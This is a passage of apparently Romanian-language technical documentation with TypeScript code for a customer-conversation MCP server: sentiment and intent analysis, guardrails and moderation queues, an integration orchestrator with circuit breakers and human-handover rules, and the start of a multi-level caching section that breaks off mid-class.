### 6.5 Integration with Workers K (Sentiment & Intent)

#### 6.5.1 Sentiment Analysis Integration

```typescript
// src/workers/mcp/integrations/sentiment-intent-integration.ts

import { Queue, QueueEvents } from 'bullmq';
import { Redis } from 'ioredis';
import { Logger } from 'pino';
import { EventEmitter } from 'events';

/**
 * Sentiment & Intent Integration
 * Integrates MCP Server with Workers K for real-time sentiment and intent analysis
 */

// Analysis types
interface AnalysisRequest {
  type: 'sentiment' | 'intent' | 'emotion' | 'composite';
  text: string;
  conversationId: string;
  messageId?: string;
  tenantId: string;
  options?: AnalysisOptions;
}

interface AnalysisOptions {
  language?: 'ro' | 'en' | 'auto';
  includeConfidence?: boolean;
  includeExplanation?: boolean;
  context?: {
    previousMessages?: string[];
    customerTier?: string;
    conversationTopic?: string;
  };
  thresholds?: {
    sentimentAlert?: number;
    intentConfidence?: number;
  };
}

interface SentimentResult {
  score: number; // -1 to 1
  label: 'very_negative' | 'negative' | 'neutral' | 'positive' | 'very_positive';
  confidence: number;
  aspects?: AspectSentiment[];
  explanation?: string;
  alerts?: SentimentAlert[];
}

interface AspectSentiment {
  aspect: string;
  score: number;
  label: string;
  mentions: string[];
}

interface SentimentAlert {
  type: 'negative_trend' | 'frustration' | 'urgency' | 'satisfaction';
  severity: 'low' | 'medium' | 'high';
  message: string;
  suggestedAction?: string;
}

interface IntentResult {
  primary: {
    intent: string;
    confidence: number;
    slots?: Record<string, unknown>;
  };
  secondary?: Array<{
    intent: string;
    confidence: number;
  }>;
  category: string;
  explanation?: string;
  suggestedResponse?: string;
  suggestedTools?: string[];
}

interface EmotionResult {
  primary: {
    emotion: string;
    intensity: number;
  };
  secondary?: Array<{
    emotion: string;
    intensity: number;
  }>;
  valence: number;
  arousal: number;
  dominance: number;
}

interface CompositeAnalysis {
  sentiment: SentimentResult;
  intent: IntentResult;
  emotion: EmotionResult;
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
  recommendations: string[];
  triggerHandover: boolean;
  handoverReason?: string;
}

export class SentimentIntentIntegration extends EventEmitter {
  private analysisQueue: Queue;
  private analysisEvents: QueueEvents;
  private redis: Redis;
  private logger: Logger;
  
  // Analysis cache
  private analysisCache: Map<string, {
    result: any;
    timestamp: number;
  }> = new Map();
  
  // Cache TTL (30 seconds for real-time analysis)
  private cacheTtl = 30000;
  
  constructor(options: {
    redis: Redis;
    logger: Logger;
  }) {
    super();
    this.redis = options.redis;
    this.logger = options.logger.child({ component: 'SentimentIntentIntegration' });
    
    this.initialize();
  }
  
  private async initialize(): Promise<void> {
    // Initialize analysis queue
    this.analysisQueue = new Queue('analysis:sentiment-intent', {
      connection: this.redis,
      defaultJobOptions: {
        attempts: 2,
        backoff: {
          type: 'fixed',
          delay: 500
        },
        removeOnComplete: 500,
        removeOnFail: 1000
      }
    });
    
    this.analysisEvents = new QueueEvents('analysis:sentiment-intent', {
      connection: this.redis
    });
    
    // Start cache cleanup
    this.startCacheCleanup();
    
    this.logger.info('Sentiment Intent Integration initialized');
  }
  
  /**
   * Analyze sentiment of text
   */
  async analyzeSentiment(request: AnalysisRequest): Promise<SentimentResult> {
    const cacheKey = this.buildCacheKey('sentiment', request);
    
    // Check cache
    const cached = this.analysisCache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < this.cacheTtl) {
      return cached.result;
    }
    
    const job = await this.analysisQueue.add('analyze-sentiment', {
      type: 'sentiment',
      tenantId: request.tenantId,
      conversationId: request.conversationId,
      messageId: request.messageId,
      text: request.text,
      options: request.options
    }, {
      priority: 2 // High priority for real-time
    });
    
    const result = await job.waitUntilFinished(this.analysisEvents, 5000);
    
    // Cache result
    this.analysisCache.set(cacheKey, {
      result,
      timestamp: Date.now()
    });
    
    // Emit alerts if any
    if (result.alerts && result.alerts.length > 0) {
      for (const alert of result.alerts) {
        this.emit('sentiment:alert', {
          conversationId: request.conversationId,
          alert
        });
      }
    }
    
    return result;
  }
  
  /**
   * Detect intent from text
   */
  async detectIntent(request: AnalysisRequest): Promise<IntentResult> {
    const cacheKey = this.buildCacheKey('intent', request);
    
    // Check cache
    const cached = this.analysisCache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < this.cacheTtl) {
      return cached.result;
    }
    
    const job = await this.analysisQueue.add('detect-intent', {
      type: 'intent',
      tenantId: request.tenantId,
      conversationId: request.conversationId,
      messageId: request.messageId,
      text: request.text,
      options: request.options
    }, {
      priority: 2
    });
    
    const result = await job.waitUntilFinished(this.analysisEvents, 5000);
    
    // Cache result
    this.analysisCache.set(cacheKey, {
      result,
      timestamp: Date.now()
    });
    
    return result;
  }
  
  /**
   * Analyze emotion from text
   */
  async analyzeEmotion(request: AnalysisRequest): Promise<EmotionResult> {
    const cacheKey = this.buildCacheKey('emotion', request);
    
    // Check cache
    const cached = this.analysisCache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < this.cacheTtl) {
      return cached.result;
    }
    
    const job = await this.analysisQueue.add('analyze-emotion', {
      type: 'emotion',
      tenantId: request.tenantId,
      conversationId: request.conversationId,
      messageId: request.messageId,
      text: request.text,
      options: request.options
    }, {
      priority: 3
    });
    
    const result = await job.waitUntilFinished(this.analysisEvents, 5000);
    
    // Cache result
    this.analysisCache.set(cacheKey, {
      result,
      timestamp: Date.now()
    });
    
    return result;
  }
  
  /**
   * Perform composite analysis (sentiment + intent + emotion)
   */
  async analyzeComposite(request: AnalysisRequest): Promise<CompositeAnalysis> {
    const cacheKey = this.buildCacheKey('composite', request);
    
    // Check cache
    const cached = this.analysisCache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < this.cacheTtl) {
      return cached.result;
    }
    
    const job = await this.analysisQueue.add('analyze-composite', {
      type: 'composite',
      tenantId: request.tenantId,
      conversationId: request.conversationId,
      messageId: request.messageId,
      text: request.text,
      options: request.options
    }, {
      priority: 1 // Highest priority
    });
    
    const result = await job.waitUntilFinished(this.analysisEvents, 10000);
    
    // Cache result
    this.analysisCache.set(cacheKey, {
      result,
      timestamp: Date.now()
    });
    
    // Check for handover trigger
    if (result.triggerHandover) {
      this.emit('analysis:handover-trigger', {
        conversationId: request.conversationId,
        reason: result.handoverReason,
        riskLevel: result.riskLevel
      });
    }
    
    return result;
  }
  
  /**
   * Get conversation sentiment trend
   */
  async getConversationTrend(
    conversationId: string,
    tenantId: string
  ): Promise<{
    trend: 'improving' | 'stable' | 'declining';
    history: Array<{ timestamp: Date; score: number }>;
    averageScore: number;
  }> {
    const cacheKey = `sentiment:trend:${tenantId}:${conversationId}`;
    
    const cached = await this.redis.get(cacheKey);
    if (cached) {
      return JSON.parse(cached);
    }
    
    const job = await this.analysisQueue.add('get-trend', {
      type: 'get_trend',
      tenantId,
      conversationId
    });
    
    const result = await job.waitUntilFinished(this.analysisEvents, 5000);
    
    // Cache for 1 minute
    await this.redis.setex(cacheKey, 60, JSON.stringify(result));
    
    return result;
  }
  
  /**
   * Stream analysis results for real-time updates
   */
  async streamAnalysis(
    request: AnalysisRequest,
    onUpdate: (update: Partial<CompositeAnalysis>) => void
  ): Promise<CompositeAnalysis> {
    const streamChannel = `analysis:stream:${request.conversationId}:${request.messageId}`;
    
    // Subscribe to updates
    const subscriber = this.redis.duplicate();
    await subscriber.subscribe(streamChannel);
    
    subscriber.on('message', (channel, message) => {
      if (channel === streamChannel) {
        const update = JSON.parse(message);
        onUpdate(update);
      }
    });
    
    try {
      // Run composite analysis
      const result = await this.analyzeComposite(request);
      
      // Cleanup
      await subscriber.unsubscribe(streamChannel);
      subscriber.disconnect();
      
      return result;
      
    } catch (error) {
      // Cleanup on error
      await subscriber.unsubscribe(streamChannel);
      subscriber.disconnect();
      throw error;
    }
  }
  
  /**
   * Build cache key
   */
  private buildCacheKey(type: string, request: AnalysisRequest): string {
    const textHash = Buffer.from(request.text.substring(0, 200))
      .toString('base64')
      .substring(0, 32);
    return `analysis:${type}:${request.tenantId}:${request.conversationId}:${textHash}`;
  }
  
  /**
   * Start cache cleanup interval
   */
  private startCacheCleanup(): void {
    setInterval(() => {
      const now = Date.now();
      for (const [key, value] of this.analysisCache) {
        if (now - value.timestamp > this.cacheTtl * 2) {
          this.analysisCache.delete(key);
        }
      }
    }, 60000);
  }
  
  /**
   * Cleanup
   */
  async shutdown(): Promise<void> {
    await this.analysisQueue.close();
    await this.analysisEvents.close();
    this.analysisCache.clear();
    this.logger.info('Sentiment Intent Integration shut down');
  }
}
```

### 6.6 Integration with Workers M (Guardrails)

#### 6.6.1 Guardrails Integration

```typescript
// src/workers/mcp/integrations/guardrails-integration.ts

import { Queue, QueueEvents } from 'bullmq';
import { Redis } from 'ioredis';
import { Logger } from 'pino';
import { EventEmitter } from 'events';

/**
 * Guardrails Integration
 * Integrates MCP Server with Workers M for content moderation,
 * compliance checking, and safety guardrails
 */

// Guardrail types
interface GuardrailCheckRequest {
  type: 'content' | 'compliance' | 'safety' | 'budget' | 'quality';
  content: string | Record<string, unknown>;
  context: {
    conversationId: string;
    sessionId: string;
    tenantId: string;
    direction: 'inbound' | 'outbound';
    channel: string;
  };
  options?: GuardrailOptions;
}

interface GuardrailOptions {
  strictMode?: boolean;
  bypassCache?: boolean;
  customRules?: string[];
  excludeRules?: string[];
}

interface GuardrailResult {
  passed: boolean;
  checks: GuardrailCheck[];
  overallScore: number;
  blockedReasons?: string[];
  warnings?: string[];
  suggestions?: string[];
  modifiedContent?: string;
}

interface GuardrailCheck {
  rule: string;
  category: string;
  passed: boolean;
  score: number;
  severity: 'info' | 'warning' | 'error' | 'critical';
  message: string;
  details?: Record<string, unknown>;
}

// Content moderation
interface ContentModerationResult {
  safe: boolean;
  categories: {
    toxic: number;
    spam: number;
    inappropriate: number;
    pii: number;
    confidential: number;
  };
  flaggedPhrases: string[];
  suggestions: string[];
}

// Compliance check
interface ComplianceCheckResult {
  compliant: boolean;
  violations: Array<{
    regulation: string;
    rule: string;
    severity: string;
    description: string;
  }>;
  recommendations: string[];
}

// Budget check
interface BudgetCheckResult {
  withinBudget: boolean;
  currentSpend: {
    tokens: number;
    apiCalls: number;
    cost: number;
  };
  limits: {
    maxTokens: number;
    maxCalls: number;
    maxCost: number;
  };
  remaining: {
    tokens: number;
    calls: number;
    cost: number;
  };
  warningThreshold: boolean;
}

export class GuardrailsIntegration extends EventEmitter {
  private guardrailQueue: Queue;
  private guardrailEvents: QueueEvents;
  private redis: Redis;
  private logger: Logger;
  
  constructor(options: {
    redis: Redis;
    logger: Logger;
  }) {
    super();
    this.redis = options.redis;
    this.logger = options.logger.child({ component: 'GuardrailsIntegration' });
    
    this.initialize();
  }
  
  private async initialize(): Promise<void> {
    this.guardrailQueue = new Queue('guardrails:checks', {
      connection: this.redis,
      defaultJobOptions: {
        attempts: 2,
        backoff: {
          type: 'fixed',
          delay: 200
        },
        removeOnComplete: 500,
        removeOnFail: 1000
      }
    });
    
    this.guardrailEvents = new QueueEvents('guardrails:checks', {
      connection: this.redis
    });
    
    this.logger.info('Guardrails Integration initialized');
  }
  
  /**
   * Run content moderation check
   */
  async moderateContent(
    content: string,
    context: GuardrailCheckRequest['context']
  ): Promise<ContentModerationResult> {
    const job = await this.guardrailQueue.add('content-moderation', {
      type: 'content_moderation',
      tenantId: context.tenantId,
      content,
      context
    }, {
      priority: 1 // High priority for real-time
    });
    
    const result = await job.waitUntilFinished(this.guardrailEvents, 5000);
    
    // Emit event if content flagged
    if (!result.safe) {
      this.emit('content:flagged', {
        conversationId: context.conversationId,
        categories: result.categories,
        flaggedPhrases: result.flaggedPhrases
      });
    }
    
    return result;
  }
  
  /**
   * Run compliance check
   */
  async checkCompliance(
    content: string | Record<string, unknown>,
    context: GuardrailCheckRequest['context'],
    regulations?: string[]
  ): Promise<ComplianceCheckResult> {
    const job = await this.guardrailQueue.add('compliance-check', {
      type: 'compliance_check',
      tenantId: context.tenantId,
      content,
      context,
      regulations: regulations || ['gdpr', 'ecommerce', 'agricultural']
    });
    
    const result = await job.waitUntilFinished(this.guardrailEvents, 10000);
    
    // Emit event if violations found
    if (!result.compliant) {
      this.emit('compliance:violation', {
        conversationId: context.conversationId,
        violations: result.violations
      });
    }
    
    return result;
  }
  
  /**
   * Check budget/usage limits
   */
  async checkBudget(
    tenantId: string,
    sessionId: string,
    estimatedUsage: {
      tokens: number;
      calls: number;
      cost: number;
    }
  ): Promise<BudgetCheckResult> {
    const cacheKey = `budget:status:${tenantId}`;
    
    // Get current usage
    const job = await this.guardrailQueue.add('budget-check', {
      type: 'budget_check',
      tenantId,
      sessionId,
      estimatedUsage
    });
    
    const result = await job.waitUntilFinished(this.guardrailEvents, 5000);
    
    // Emit warning if approaching limit
    if (result.warningThreshold) {
      this.emit('budget:warning', {
        tenantId,
        remaining: result.remaining
      });
    }
    
    // Emit event if over budget
    if (!result.withinBudget) {
      this.emit('budget:exceeded', {
        tenantId,
        currentSpend: result.currentSpend,
        limits: result.limits
      });
    }
    
    return result;
  }
  
  /**
   * Run quality assurance check
   */
  async checkQuality(
    response: string,
    context: {
      conversationId: string;
      tenantId: string;
      intent: string;
    }
  ): Promise<{
    qualityScore: number;
    aspects: {
      relevance: number;
      clarity: number;
      completeness: number;
      professionalism: number;
      accuracy: number;
    };
    issues: string[];
    suggestions: string[];
  }> {
    const job = await this.guardrailQueue.add('quality-check', {
      type: 'quality_check',
      tenantId: context.tenantId,
      content: response,
      context
    });
    
    return await job.waitUntilFinished(this.guardrailEvents, 5000);
  }
  
  /**
   * Run comprehensive guardrail check
   */
  async runFullCheck(request: GuardrailCheckRequest): Promise<GuardrailResult> {
    const job = await this.guardrailQueue.add('full-check', {
      ...request,
      fullCheck: true
    }, {
      priority: 2
    });
    
    const result = await job.waitUntilFinished(this.guardrailEvents, 15000);
    
    // Handle blocked content
    if (!result.passed) {
      this.emit('guardrail:blocked', {
        conversationId: request.context.conversationId,
        reasons: result.blockedReasons
      });
    }
    
    return result;
  }
  
  /**
   * Sanitize PII from content
   */
  async sanitizePII(
    content: string,
    tenantId: string
  ): Promise<{
    sanitized: string;
    foundPII: Array<{
      type: string;
      original: string;
      masked: string;
    }>;
  }> {
    const job = await this.guardrailQueue.add('sanitize-pii', {
      type: 'sanitize_pii',
      tenantId,
      content
    });
    
    return await job.waitUntilFinished(this.guardrailEvents, 5000);
  }
  
  /**
   * Cleanup
   */
  async shutdown(): Promise<void> {
    await this.guardrailQueue.close();
    await this.guardrailEvents.close();
    this.logger.info('Guardrails Integration shut down');
  }
}
```

### 6.7 Integration Orchestrator

#### 6.7.1 Unified Integration Orchestrator

```typescript
// src/workers/mcp/integrations/integration-orchestrator.ts

import { EventEmitter } from 'events';
import { Redis } from 'ioredis';
import { Logger } from 'pino';
import { AIAgentIntegration } from './ai-agent-integration';
import { ProductKnowledgeIntegration } from './product-knowledge-integration';
import { HandoverIntegration } from './handover-integration';
import { SentimentIntentIntegration } from './sentiment-intent-integration';
import { GuardrailsIntegration } from './guardrails-integration';

/**
 * Integration Orchestrator
 * Coordinates all integrations for seamless MCP Server operation
 */

interface OrchestratorConfig {
  enableParallelProcessing: boolean;
  defaultTimeout: number;
  maxConcurrentIntegrations: number;
  retryPolicy: {
    maxRetries: number;
    backoffMultiplier: number;
    initialDelay: number;
  };
  circuitBreaker: {
    enabled: boolean;
    threshold: number;
    resetTimeout: number;
  };
}

interface IntegrationHealth {
  name: string;
  status: 'healthy' | 'degraded' | 'unhealthy';
  lastCheck: Date;
  latency: number;
  errorRate: number;
  circuitOpen: boolean;
}

interface ProcessingContext {
  sessionId: string;
  conversationId: string;
  tenantId: string;
  messageId: string;
  channel: string;
}

interface ProcessingResult {
  aiResponse?: any;
  sentiment?: any;
  intent?: any;
  guardrailResult?: any;
  handoverRequired?: boolean;
  processingTime: number;
  integrationStats: {
    [key: string]: {
      called: boolean;
      duration: number;
      success: boolean;
      cached: boolean;
    };
  };
}

export class IntegrationOrchestrator extends EventEmitter {
  private redis: Redis;
  private logger: Logger;
  private config: OrchestratorConfig;
  
  // Integration instances
  private aiAgent: AIAgentIntegration;
  private productKnowledge: ProductKnowledgeIntegration;
  private handover: HandoverIntegration;
  private sentimentIntent: SentimentIntentIntegration;
  private guardrails: GuardrailsIntegration;
  
  // Circuit breaker state
  private circuitBreakers: Map<string, {
    failures: number;
    lastFailure: Date | null;
    isOpen: boolean;
  }> = new Map();
  
  // Health tracking
  private healthStatus: Map<string, IntegrationHealth> = new Map();
  
  constructor(options: {
    redis: Redis;
    logger: Logger;
    config?: Partial<OrchestratorConfig>;
  }) {
    super();
    this.redis = options.redis;
    this.logger = options.logger.child({ component: 'IntegrationOrchestrator' });
    
    this.config = {
      enableParallelProcessing: true,
      defaultTimeout: 30000,
      maxConcurrentIntegrations: 5,
      retryPolicy: {
        maxRetries: 3,
        backoffMultiplier: 2,
        initialDelay: 500
      },
      circuitBreaker: {
        enabled: true,
        threshold: 5,
        resetTimeout: 60000
      },
      ...options.config
    };
    
    this.initializeIntegrations();
    this.setupEventHandlers();
    this.startHealthMonitoring();
  }
  
  /**
   * Initialize all integrations
   */
  private initializeIntegrations(): void {
    const integrationOptions = {
      redis: this.redis,
      logger: this.logger
    };
    
    this.aiAgent = new AIAgentIntegration(integrationOptions);
    this.productKnowledge = new ProductKnowledgeIntegration(integrationOptions);
    this.handover = new HandoverIntegration(integrationOptions);
    this.sentimentIntent = new SentimentIntentIntegration(integrationOptions);
    this.guardrails = new GuardrailsIntegration(integrationOptions);
    
    // Initialize circuit breakers
    const integrationNames = [
      'aiAgent', 'productKnowledge', 'handover', 
      'sentimentIntent', 'guardrails'
    ];
    
    for (const name of integrationNames) {
      this.circuitBreakers.set(name, {
        failures: 0,
        lastFailure: null,
        isOpen: false
      });
      
      this.healthStatus.set(name, {
        name,
        status: 'healthy',
        lastCheck: new Date(),
        latency: 0,
        errorRate: 0,
        circuitOpen: false
      });
    }
    
    this.logger.info('All integrations initialized');
  }
  
  /**
   * Setup event handlers for all integrations
   */
  private setupEventHandlers(): void {
    // AI Agent events
    this.aiAgent.on('request:sent', (data) => {
      this.emit('integration:aiAgent:request', data);
    });
    
    this.aiAgent.on('response:received', (data) => {
      this.emit('integration:aiAgent:response', data);
    });
    
    // Handover events
    this.handover.on('handover:requested', (data) => {
      this.emit('integration:handover:requested', data);
    });
    
    this.handover.on('handover:completed', (data) => {
      this.emit('integration:handover:completed', data);
    });
    
    // Sentiment events
    this.sentimentIntent.on('sentiment:alert', (data) => {
      this.emit('integration:sentiment:alert', data);
    });
    
    this.sentimentIntent.on('analysis:handover-trigger', (data) => {
      this.handleHandoverTrigger(data);
    });
    
    // Guardrails events
    this.guardrails.on('content:flagged', (data) => {
      this.emit('integration:guardrails:flagged', data);
    });
    
    this.guardrails.on('guardrail:blocked', (data) => {
      this.emit('integration:guardrails:blocked', data);
    });
    
    this.guardrails.on('budget:exceeded', (data) => {
      this.emit('integration:budget:exceeded', data);
    });
  }
  
  /**
   * Process incoming message through all integrations
   */
  async processMessage(
    message: string,
    context: ProcessingContext,
    options?: {
      skipGuardrails?: boolean;
      skipSentiment?: boolean;
      forceHandover?: boolean;
    }
  ): Promise<ProcessingResult> {
    const startTime = Date.now();
    const stats: ProcessingResult['integrationStats'] = {};
    
    this.logger.debug({
      conversationId: context.conversationId,
      messageLength: message.length
    }, 'Processing message through integrations');
    
    try {
      // Step 1: Content moderation (guardrails)
      let guardrailResult = null;
      if (!options?.skipGuardrails) {
        const guardrailStart = Date.now();
        guardrailResult = await this.withCircuitBreaker('guardrails', async () => {
          return await this.guardrails.moderateContent(message, {
            conversationId: context.conversationId,
            sessionId: context.sessionId,
            tenantId: context.tenantId,
            direction: 'inbound',
            channel: context.channel
          });
        });
        stats.guardrails = {
          called: true,
          duration: Date.now() - guardrailStart,
          success: true,
          cached: false
        };
        
        // If content is not safe, block processing
        if (!guardrailResult.safe) {
          this.logger.warn({
            conversationId: context.conversationId
          }, 'Message blocked by guardrails');
          
          return {
            guardrailResult,
            handoverRequired: false,
            processingTime: Date.now() - startTime,
            integrationStats: stats
          };
        }
      }
      
      // Step 2: Parallel analysis (sentiment + intent)
      let sentiment = null;
      let intent = null;
      
      if (!options?.skipSentiment && this.config.enableParallelProcessing) {
        const analysisStart = Date.now();
        
        const [sentimentResult, intentResult] = await Promise.all([
          this.withCircuitBreaker('sentimentIntent', async () => {
            return await this.sentimentIntent.analyzeSentiment({
              type: 'sentiment',
              text: message,
              conversationId: context.conversationId,
              messageId: context.messageId,
              tenantId: context.tenantId
            });
          }),
          this.withCircuitBreaker('sentimentIntent', async () => {
            return await this.sentimentIntent.detectIntent({
              type: 'intent',
              text: message,
              conversationId: context.conversationId,
              messageId: context.messageId,
              tenantId: context.tenantId
            });
          })
        ]);
        
        sentiment = sentimentResult;
        intent = intentResult;
        
        stats.sentimentIntent = {
          called: true,
          duration: Date.now() - analysisStart,
          success: true,
          cached: false
        };
      }
      
      // Step 3: Check if handover is required
      let handoverRequired = options?.forceHandover || false;
      
      if (!handoverRequired && sentiment && intent) {
        handoverRequired = this.shouldTriggerHandover(sentiment, intent);
      }
      
      // Step 4: Generate AI response (if no handover)
      let aiResponse = null;
      
      if (!handoverRequired) {
        const aiStart = Date.now();
        
        aiResponse = await this.withCircuitBreaker('aiAgent', async () => {
          // Build context
          const aiContext = await this.aiAgent.buildContext(
            context.sessionId,
            context.conversationId,
            context.tenantId
          );
          
          // Build request
          const request = new (await import('./ai-agent-request-builder')).AIAgentRequestBuilder()
            .forType('generate_response')
            .forSession(context.sessionId)
            .forConversation(context.conversationId)
            .forTenant(context.tenantId)
            .withUserMessage(message)
            .withCustomer(aiContext.customer)
            .withConversationContext(aiContext.conversation)
            .withBusinessContext(aiContext.business)
            .withLanguage('ro')
            .withTone('professional')
            .build();
          
          return await this.aiAgent.generateResponse(request);
        });
        
        stats.aiAgent = {
          called: true,
          duration: Date.now() - aiStart,
          success: aiResponse.success,
          cached: aiResponse.metadata?.cached || false
        };
      }
      
      // Step 5: Return result
      return {
        aiResponse,
        sentiment,
        intent,
        guardrailResult,
        handoverRequired,
        processingTime: Date.now() - startTime,
        integrationStats: stats
      };
      
    } catch (error) {
      this.logger.error({
        error: error instanceof Error ? error.message : 'Unknown error',
        conversationId: context.conversationId
      }, 'Error processing message');
      
      throw error;
    }
  }
  
  /**
   * Search products through integration
   */
  async searchProducts(
    query: string,
    tenantId: string,
    filters?: any
  ): Promise<any> {
    return await this.withCircuitBreaker('productKnowledge', async () => {
      return await this.productKnowledge.searchProducts({
        query,
        tenantId,
        filters
      });
    });
  }
  
  /**
   * Request handover through integration
   */
  async requestHandover(
    request: any
  ): Promise<any> {
    return await this.withCircuitBreaker('handover', async () => {
      return await this.handover.requestHandover(request);
    });
  }
  
  /**
   * Execute with circuit breaker pattern
   */
  private async withCircuitBreaker<T>(
    integrationName: string,
    fn: () => Promise<T>
  ): Promise<T> {
    const breaker = this.circuitBreakers.get(integrationName);
    
    if (!breaker) {
      return fn();
    }
    
    // Check if circuit is open
    if (this.config.circuitBreaker.enabled && breaker.isOpen) {
      // Check if reset timeout has passed
      if (breaker.lastFailure && 
          Date.now() - breaker.lastFailure.getTime() > this.config.circuitBreaker.resetTimeout) {
        // Half-open state - try one request
        breaker.isOpen = false;
        this.logger.info({ integrationName }, 'Circuit breaker half-open, attempting request');
      } else {
        throw new Error(`Circuit breaker open for ${integrationName}`);
      }
    }
    
    try {
      const result = await fn();
      
      // Reset failures on success
      breaker.failures = 0;
      
      // Update health status
      const health = this.healthStatus.get(integrationName);
      if (health) {
        health.status = 'healthy';
        health.circuitOpen = false;
      }
      
      return result;
      
    } catch (error) {
      // Increment failures
      breaker.failures++;
      breaker.lastFailure = new Date();
      
      // Check if threshold exceeded
      if (this.config.circuitBreaker.enabled && 
          breaker.failures >= this.config.circuitBreaker.threshold) {
        breaker.isOpen = true;
        this.logger.warn({
          integrationName,
          failures: breaker.failures
        }, 'Circuit breaker opened');
        
        // Update health status
        const health = this.healthStatus.get(integrationName);
        if (health) {
          health.status = 'unhealthy';
          health.circuitOpen = true;
        }
      }
      
      throw error;
    }
  }
  
  /**
   * Check if handover should be triggered
   */
  private shouldTriggerHandover(sentiment: any, intent: any): boolean {
    // Very negative sentiment
    if (sentiment.score < -0.7) {
      return true;
    }
    
    // Explicit handover intent
    if (intent.primary.intent === 'request_human_agent' && 
        intent.primary.confidence > 0.8) {
      return true;
    }
    
    // Complex inquiry with low AI confidence
    if (intent.primary.intent === 'complex_inquiry' && 
        intent.primary.confidence < 0.6) {
      return true;
    }
    
    return false;
  }
  
  /**
   * Handle handover trigger from sentiment analysis
   */
  private async handleHandoverTrigger(data: any): Promise<void> {
    this.logger.info({
      conversationId: data.conversationId,
      reason: data.reason
    }, 'Handover triggered by analysis');
    
    this.emit('handover:triggered', data);
  }
  
  /**
   * Start health monitoring
   */
  private startHealthMonitoring(): void {
    setInterval(async () => {
      await this.checkAllHealthStatus();
    }, 30000); // Check every 30 seconds
  }
  
  /**
   * Check health status of all integrations
   */
  private async checkAllHealthStatus(): Promise<void> {
    for (const [name, health] of this.healthStatus) {
      const breaker = this.circuitBreakers.get(name);
      
      health.lastCheck = new Date();
      health.circuitOpen = breaker?.isOpen || false;
      
      // Calculate error rate
      if (breaker) {
        health.errorRate = breaker.failures / 10; // Simplified
      }
      
      // Update status
      if (health.circuitOpen) {
        health.status = 'unhealthy';
      } else if (health.errorRate > 0.3) {
        health.status = 'degraded';
      } else {
        health.status = 'healthy';
      }
    }
    
    this.emit('health:updated', this.getHealthStatus());
  }
  
  /**
   * Get health status of all integrations
   */
  getHealthStatus(): IntegrationHealth[] {
    return Array.from(this.healthStatus.values());
  }
  
  /**
   * Get specific integration
   */
  getIntegration<T>(name: string): T | null {
    switch (name) {
      case 'aiAgent': return this.aiAgent as unknown as T;
      case 'productKnowledge': return this.productKnowledge as unknown as T;
      case 'handover': return this.handover as unknown as T;
      case 'sentimentIntent': return this.sentimentIntent as unknown as T;
      case 'guardrails': return this.guardrails as unknown as T;
      default: return null;
    }
  }
  
  /**
   * Shutdown all integrations
   */
  async shutdown(): Promise<void> {
    await Promise.all([
      this.aiAgent.shutdown(),
      this.productKnowledge.shutdown(),
      this.handover.shutdown(),
      this.sentimentIntent.shutdown(),
      this.guardrails.shutdown()
    ]);
    
    this.logger.info('Integration Orchestrator shut down');
  }
}

// Export singleton factory
export function createIntegrationOrchestrator(options: {
  redis: Redis;
  logger: Logger;
  config?: Partial<OrchestratorConfig>;
}): IntegrationOrchestrator {
  return new IntegrationOrchestrator(options);
}
```

---

## 7. Performance & Caching

### 7.1 Caching Strategy Overview

MCP Server implementează o strategie de caching multi-nivel pentru optimizarea performanței și reducerea latențelor.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       Multi-Level Caching Architecture                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                         Level 1: Memory Cache                            │ │
│  │  ┌─────────────────────────────────────────────────────────────────┐   │ │
│  │  │  • In-process LRU cache                                          │   │ │
│  │  │  • TTL: 30 seconds - 5 minutes                                   │   │ │
│  │  │  • Size: 1000-10000 entries per worker                          │   │ │
│  │  │  • Use case: Hot data, session state, active resources          │   │ │
│  │  └─────────────────────────────────────────────────────────────────┘   │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                    │                                          │
│                                    ▼                                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                         Level 2: Redis Cache                             │ │
│  │  ┌─────────────────────────────────────────────────────────────────┐   │ │
│  │  │  • Distributed cache                                             │   │ │
│  │  │  • TTL: 1 minute - 1 hour                                       │   │ │
│  │  │  • Use case: Shared state, cross-worker data, tool results      │   │ │
│  │  │  • Eviction: LRU with maxmemory-policy                          │   │ │
│  │  └─────────────────────────────────────────────────────────────────┘   │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                    │                                          │
│                                    ▼                                          │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                       Level 3: Database Cache                            │ │
│  │  ┌─────────────────────────────────────────────────────────────────┐   │ │
│  │  │  • Materialized views                                            │   │ │
│  │  │  • Pre-computed aggregations                                     │   │ │
│  │  │  • TTL: 5 minutes - 24 hours                                    │   │ │
│  │  │  • Use case: Complex queries, reporting data                     │   │ │
│  │  └─────────────────────────────────────────────────────────────────┘   │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                               │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                      Cache Invalidation Strategy                         │ │
│  │  • Event-driven invalidation via Redis Pub/Sub                          │ │
│  │  • Write-through for critical data                                      │ │
│  │  • Background refresh for near-real-time data                           │ │
│  │  • Cascade invalidation for dependent data                              │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 7.2 Memory Cache Implementation

```typescript
// src/workers/mcp/cache/memory-cache.ts

import { EventEmitter } from 'events';
import { Logger } from 'pino';

/**
 * LRU Memory Cache
 * High-performance in-memory cache with LRU eviction
 */

interface CacheEntry<T> {
  value: T;
  expiresAt: number;
  size: number;
  accessCount: number;
  lastAccess: number;
}

interface MemoryCacheConfig {
  maxEntries: number;
  maxSize: number; // bytes
  defaultTtl: number; // milliseconds
  cleanupInterval: number; // milliseconds
  enableStats: boolean;
}

interface CacheStats {
  hits: number;
  misses: number;
  sets: number;
  deletes: number;
  evictions: number;
  currentEntries: number;
  currentSize: number;
  hitRate: number;
}

export class MemoryCache<T = unknown> extends EventEmitter {
  private cache: Map<string, CacheEntry<T>> = new Map();
  private accessOrder: string[] = [];
  private config: MemoryCacheConfig;
  private stats: CacheStats;
  private cleanupTimer: NodeJS.Timeout | null = null;
  private logger: Logger;
  
  constructor(options: {
